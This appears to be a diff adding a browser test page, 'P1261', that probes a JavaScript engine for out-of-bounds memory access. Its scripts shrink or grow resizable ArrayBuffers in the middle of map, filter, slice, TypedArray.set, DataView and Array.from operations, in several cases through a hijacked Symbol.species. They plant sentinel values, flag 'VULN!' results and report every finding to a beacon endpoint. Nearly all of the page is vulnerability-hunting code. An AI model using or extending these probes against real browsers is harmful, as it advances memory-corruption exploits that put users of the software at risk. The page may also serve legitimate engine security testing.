@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1261</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1261-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1261: RAB SHRINK OOB WRITE ===');
+B('START','P1261');
+</script>
+
+<!-- A: Shrink RAB during map species write — THE KEY TEST -->
+<script>
+log('\n--- A: RAB shrink during map species write ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+    // f64 has 8 elements (64/8)
+
+    var arr=[10,20,30,40,50,60,70,80];
+    arr.constructor={};
+    arr.constructor[Symbol.species]=function(len){ return f64; };
+
+    var shrunk=false;
+    var callLog=[];
+
+    var result=arr.map(function(x,i){
+      callLog.push(i);
+      if(i===2 && !shrunk){
+        shrunk=true;
+        // SHRINK the RAB to 16 bytes (2 elements) — map should be writing at index 3+ next
+        try{
+          rab.resize(16);
+          B('A0','shrink_ok|new_len='+rab.byteLength+'|view_len='+f64.length);
+        }catch(e){
+          B('A0','shrink_err:'+e.name+':'+e.message.slice(0,60));
+        }
+      }
+      return x*100; // Return 1000,2000,3000,...
+    });
+
+    B('A1','calls='+callLog.join(',')+
+      '|shrunk='+shrunk+
+      '|buf_len='+rab.byteLength+
+      '|view_len='+f64.length+
+      '|result_len='+result.length);
+
+    // Read what's in the view after shrink
+    var vals=[];
+    for(var i=0;i<Math.min(f64.length,16);i++){
+      try{ vals.push(i+':'+f64[i]); }
+      catch(e){ vals.push(i+':ERR'); }
+    }
+    B('A2','view_vals='+vals.join(';'));
+
+    // Check if result is the same Float64Array
+    B('A3','isSame='+(result===f64)+
+      '|result_type='+result.constructor.name);
+
+  }catch(e){B('A1','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- B: RAB shrink during TypedArray.set (non-species path) -->
+<script>
+log('\n--- B: RAB shrink during TA.set ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+    var sentinel=new BigUint64Array(rab);
+    for(var i=0;i<sentinel.length;i++) sentinel[i]=0xAAAAAAAAAAAAAAAAn;
+
+    // Source array with valueOf that shrinks at element 3
+    var src=[];
+    for(var i=0;i<8;i++){
+      if(i===3){
+        src.push({valueOf:function(){
+          try{ rab.resize(16); }catch(e){}
+          return 333.333;
+        }});
+      }else{
+        src.push(i*11.1);
+      }
+    }
+
+    try{
+      f64.set(src);
+      B('B1','set_ok|buf_len='+rab.byteLength+'|view_len='+f64.length);
+    }catch(e){
+      B('B1','set_err:'+e.name+':'+e.message.slice(0,60)+
+        '|buf_len='+rab.byteLength+'|view_len='+f64.length);
+    }
+
+    // What survived?
+    var vals=[];
+    for(var i=0;i<Math.min(f64.length,8);i++){
+      try{ vals.push(i+':'+f64[i]); }
+      catch(e){ vals.push(i+':ERR'); }
+    }
+    B('B2','vals='+vals.join(';'));
+
+  }catch(e){B('B1','outer_err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- C: RAB shrink during DataView operations -->
+<script>
+log('\n--- C: RAB shrink during DataView ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var dv=new DataView(rab);
+
+    // Write first 3 values
+    dv.setFloat64(0, 1.1);
+    dv.setFloat64(8, 2.2);
+    dv.setFloat64(16, 3.3);
+
+    // Shrink to 16 bytes
+    rab.resize(16);
+    B('C1','shrunk|buf='+rab.byteLength);
+
+    // Try to read at offset 16 (now OOB)
+    try{
+      var v=dv.getFloat64(16);
+      B('C2','read_oob='+v+'|VULN!');
+    }catch(e){
+      B('C2','read_oob_err:'+e.name);
+    }
+
+    // Try to write at offset 16 (now OOB)
+    try{
+      dv.setFloat64(16, 99.99);
+      B('C3','write_oob=ok|VULN!');
+    }catch(e){
+      B('C3','write_oob_err:'+e.name);
+    }
+
+    // Grow back and check if OOB write landed
+    rab.resize(64);
+    var afterGrow=dv.getFloat64(16);
+    B('C4','after_grow_16='+afterGrow+
+      '|was_3.3='+(afterGrow===3.3)+
+      '|was_99.99='+(afterGrow===99.99)+
+      '|was_0='+(afterGrow===0));
+
+  }catch(e){B('C1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- D: RAB shrink during Array.from reading a TypedArray view -->
+<script>
+log('\n--- D: RAB shrink during Array.from of TA view ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(80, {maxByteLength:256});
+    var f64=new Float64Array(rab); // 10 elements
+    for(var i=0;i<10;i++) f64[i]=(i+1)*1.1;
+
+    var readLog=[];
+    var result=Array.from(f64, function(x, i){
+      readLog.push(i+':'+x);
+      if(i===3){
+        // Shrink to 16 bytes (2 elements) — f64 now has 2 elements
+        rab.resize(16);
+      }
+      return x;
+    });
+
+    B('D1','result_len='+result.length+
+      '|reads='+readLog.join(';'));
+
+    // What values did we get past the shrink point?
+    var rVals=[];
+    for(var i=0;i<result.length;i++) rVals.push(i+':'+result[i]);
+    B('D2','result_vals='+rVals.join(';'));
+
+  }catch(e){B('D1','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- E: RAB shrink during filter species write -->
+<script>
+log('\n--- E: RAB shrink during filter species ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(80, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+    for(var i=0;i<f64.length;i++) f64[i]=0;
+
+    var arr=[1,2,3,4,5,6,7,8,9,10];
+    arr.constructor={};
+    arr.constructor[Symbol.species]=function(len){ return f64; };
+
+    var filterCount=0;
+    var result=arr.filter(function(x){
+      filterCount++;
+      if(filterCount===5){
+        // Shrink after 5 predicate calls — some writes already done
+        rab.resize(8); // Only 1 Float64 element
+      }
+      return x>3; // Keep 4,5,6,7,8,9,10 — 7 elements to write
+    });
+
+    B('E1','filterCalls='+filterCount+
+      '|buf_len='+rab.byteLength+
+      '|view_len='+f64.length+
+      '|result_len='+result.length);
+
+    // Check what's in the view
+    var vals=[];
+    for(var i=0;i<Math.min(f64.length,12);i++){
+      try{vals.push(i+':'+f64[i]);}catch(e){vals.push(i+':ERR');}
+    }
+    B('E2','vals='+vals.join(';'));
+
+  }catch(e){B('E1','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- F: RAB shrink during slice species write -->
+<script>
+log('\n--- F: RAB shrink during slice ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(80, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+
+    var arr=[100,200,300,400,500,600,700,800,900,1000];
+
+    // Getter at index 2 shrinks the RAB
+    Object.defineProperty(arr, "2", {
+      get:function(){
+        rab.resize(8); // Shrink to 1 element
+        return 300;
+      },
+      configurable:true, enumerable:true
+    });
+
+    arr.constructor={};
+    arr.constructor[Symbol.species]=function(len){ return f64; };
+
+    try{
+      var result=arr.slice(0); // Copy all 10 elements
+      B('F1','result_len='+result.length+
+        '|buf_len='+rab.byteLength+
+        '|view_len='+f64.length);
+      var vals=[];
+      for(var i=0;i<Math.min(result.length||10,12);i++){
+        try{vals.push(i+':'+result[i]);}catch(e){vals.push(i+':ERR');}
+      }
+      B('F2','vals='+vals.join(';'));
+    }catch(e){
+      B('F1','slice_err:'+e.name+':'+e.message.slice(0,60));
+    }
+
+  }catch(e){B('F1','outer_err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- G: RAB grow + overflow — grow so view length overflows -->
+<script>
+log('\n--- G: RAB grow overflow ---');
+(function(){
+  try{
+    // Create RAB with max near the limit
+    var rab=new ArrayBuffer(8, {maxByteLength:0x40000000}); // 1GB max
+    B('G1','created|len='+rab.byteLength+'|max='+rab.maxByteLength);
+
+    // How big can we actually resize?
+    var sizes=[256, 4096, 65536, 1048576, 16777216, 67108864, 268435456, 536870912, 1073741824];
+    var maxAchieved=8;
+    for(var i=0;i<sizes.length;i++){
+      try{
+        rab.resize(sizes[i]);
+        maxAchieved=sizes[i];
+      }catch(e){
+        B('G2','max_resize='+maxAchieved+'|failed_at='+sizes[i]+':'+e.name);
+        break;
+      }
+    }
+    if(maxAchieved===1073741824) B('G2','max_resize=1GB_ok');
+
+    // Reset to small
+    rab.resize(64);
+    var f64=new Float64Array(rab);
+    var u64=new BigUint64Array(rab);
+
+    // Species map with grow during callback
+    var arr=new Array(8);
+    for(var i=0;i<8;i++) arr[i]=i+1;
+    arr.constructor={};
+    arr.constructor[Symbol.species]=function(len){ return f64; };
+
+    // Fill sentinel
+    for(var i=0;i<u64.length;i++) u64[i]=0xBBBBBBBBBBBBBBBBn;
+
+    var result=arr.map(function(x,i){
+      if(i===4){
+        rab.resize(256); // Grow 4x during write
+      }
+      return x*1000;
+    });
+
+    // Check: did map write past the original 8-element boundary?
+    var u64After=new BigUint64Array(rab);
+    var modified=[];
+    for(var i=0;i<u64After.length;i++){
+      if(u64After[i]!==0xBBBBBBBBBBBBBBBBn && u64After[i]!==0n){
+        modified.push(i+':0x'+u64After[i].toString(16));
+      }
+    }
+    B('G3','modified='+modified.length+'|data='+modified.slice(0,10).join(';'));
+
+  }catch(e){B('G1','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- H: RAB shrink to zero during TA iteration -->
+<script>
+log('\n--- H: RAB shrink to zero ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+    for(var i=0;i<8;i++) f64[i]=(i+1)*1.1;
+
+    // Direct indexed read after shrink to 0
+    rab.resize(0);
+    B('H1','buf='+rab.byteLength+'|view_len='+f64.length);
+
+    try{
+      var v=f64[0];
+      B('H2','f64[0]='+v+'|isUndef='+(v===undefined));
+    }catch(e){B('H2','read_err:'+e.name);}
+
+    // Grow back
+    rab.resize(64);
+    B('H3','buf='+rab.byteLength+'|view_len='+f64.length);
+
+    // What's in the buffer after grow-back?
+    var u64=new BigUint64Array(rab);
+    var bits=[];
+    for(var i=0;i<u64.length;i++){
+      bits.push(i+':0x'+u64[i].toString(16));
+    }
+    B('H4','bits='+bits.join(';'));
+
+    // Did the old values survive the shrink+grow cycle?
+    var fvals=[];
+    for(var i=0;i<f64.length;i++) fvals.push(i+':'+f64[i]);
+    B('H5','fvals='+fvals.join(';'));
+
+  }catch(e){B('H1','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1261 COMPLETE ===');
+}, 5000);
+</script>
+
+</body>
+</html>
